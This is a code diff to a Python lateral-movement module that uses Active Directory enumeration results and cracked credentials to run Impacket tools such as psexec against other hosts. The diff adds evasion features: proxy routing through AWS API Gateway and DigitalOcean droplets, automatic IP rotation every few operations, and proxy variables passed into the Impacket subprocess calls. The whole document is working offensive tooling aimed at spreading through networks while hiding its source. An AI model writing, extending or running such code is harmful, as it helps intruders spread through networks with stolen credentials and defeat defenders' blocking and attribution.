@@ -2,6 +2,7 @@
 Auto Lateral Movement Module
 Automatically pivots to other hosts using AD enum results and cracked credentials
 Integrates with Impacket for remote execution
+OPSEC: Supports IP rotation through AWS API Gateway and DigitalOcean proxies
 """
 
 import os
@@ -18,6 +19,13 @@ from cyberapp.models.credentials import CredentialStore
 from cybermodules.helpers import log_to_intel
 from cybermodules.ad_enum import ActiveDirectoryEnum
 
+# OPSEC Integration
+try:
+    from cybermodules.opsec import OpSecEngine
+    HAS_OPSEC = True
+except ImportError:
+    HAS_OPSEC = False
+
 
 class LateralMethod(Enum):
     """Lateral movement methods"""
@@ -33,9 +41,10 @@ class LateralMovementEngine:
     """
     Auto lateral movement engine
     Automatically discovers and pivots to target hosts
+    OPSEC: Supports proxy routing and traffic obfuscation
     """
     
-    def __init__(self, scan_id, session_info=None):
+    def __init__(self, scan_id, session_info=None, opsec_enabled=False):
         self.scan_id = scan_id
         self.session_info = session_info or {}
         self.domain = session_info.get("domain", "")
@@ -55,6 +64,16 @@ class LateralMovementEngine:
         self.timeout = 30
         self.port_scan_timeout = 5
         
+        # OPSEC Settings
+        self.opsec_enabled = opsec_enabled and HAS_OPSEC
+        self.opsec_engine = None
+        self.proxy_url = None
+        self.rotation_interval = 5  # Rotate proxy every N operations
+        self.operation_count = 0
+        
+        if self.opsec_enabled:
+            self._init_opsec()
+        
         # Impacket paths
         self.impacket_path = "/opt/impacket/examples"
         self.psexec_path = f"{self.impacket_path}/psexec.py"
@@ -67,6 +86,68 @@ class LateralMovementEngine:
         # Results directory
         self.output_dir = f"/tmp/lateral_{scan_id}"
         os.makedirs(self.output_dir, exist_ok=True)
+    
+    # ==================== OPSEC INTEGRATION ====================
+    
+    def _init_opsec(self):
+        """Initialize OPSEC engine for IP rotation"""
+        if not HAS_OPSEC:
+            self.log("OPSEC", "OpSecEngine not available - running without OPSEC")
+            return
+        
+        try:
+            self.opsec_engine = OpSecEngine(self.scan_id)
+            # Try to create AWS API Gateway proxy
+            test_url = f"https://{self.domain}" if self.domain else "https://microsoft.com"
+            self.proxy_url = self.opsec_engine.create_aws_api_gateway(test_url)
+            
+            if not self.proxy_url:
+                # Fallback to DigitalOcean
+                do_ip = self.opsec_engine.create_digitalocean_droplet()
+                if do_ip:
+                    self.proxy_url = f"http://{do_ip}:8080"
+            
+            if self.proxy_url:
+                self.log("OPSEC", f"Proxy initialized: {self.proxy_url}")
+            else:
+                self.log("OPSEC", "No proxy available - running direct")
+                
+        except Exception as e:
+            self.log("OPSEC", f"OPSEC init failed: {str(e)[:100]}")
+    
+    def _rotate_proxy_if_needed(self):
+        """Rotate proxy after N operations for OPSEC"""
+        if not self.opsec_enabled or not self.opsec_engine:
+            return
+        
+        self.operation_count += 1
+        if self.operation_count >= self.rotation_interval:
+            self.operation_count = 0
+            new_proxy = self.opsec_engine.rotate_ip()
+            if new_proxy:
+                self.proxy_url = new_proxy
+                self.log("OPSEC", f"Proxy rotated to: {new_proxy}")
+    
+    def _get_proxy_env(self):
+        """Get proxy environment variables for subprocess calls"""
+        if not self.opsec_enabled or not self.proxy_url:
+            return {}
+        
+        return {
+            "HTTP_PROXY": self.proxy_url,
+            "HTTPS_PROXY": self.proxy_url,
+            "http_proxy": self.proxy_url,
+            "https_proxy": self.proxy_url,
+        }
+    
+    def cleanup_opsec(self):
+        """Cleanup OPSEC resources (proxies, droplets)"""
+        if self.opsec_engine:
+            try:
+                self.opsec_engine.cleanup()
+                self.log("OPSEC", "OPSEC resources cleaned up")
+            except Exception as e:
+                self.log("OPSEC", f"OPSEC cleanup failed: {str(e)[:50]}")
     
     def log(self, msg_type, message):
         """Log to intel table"""
@@ -318,10 +399,16 @@ class LateralMovementEngine:
     def _execute_impacket(self, method, target, credentials, command=None):
         """
         Execute Impacket lateral movement
+        OPSEC: Routes traffic through proxy if enabled
         """
         target_name = target.get('hostname') or target.get('ip', 'unknown')
         
+        # OPSEC: Rotate proxy if needed
+        self._rotate_proxy_if_needed()
+        
         self.log("EXEC", f"Attempting {method.value} on {target_name}...")
+        if self.opsec_enabled and self.proxy_url:
+            self.log("OPSEC", f"Routing through proxy: {self.proxy_url}")
         
         # Build command
         cmd = self._build_impacket_command(method, target, credentials)
@@ -330,11 +417,16 @@ class LateralMovementEngine:
             cmd.append(command)
         
         try:
+            # OPSEC: Add proxy environment variables
+            env = os.environ.copy()
+            env.update(self._get_proxy_env())
+            
             result = subprocess.run(
                 cmd,
                 capture_output=True,
                 text=True,
-                timeout=self.timeout
+                timeout=self.timeout,
+                env=env if self.opsec_enabled else None
             )
             
             return {
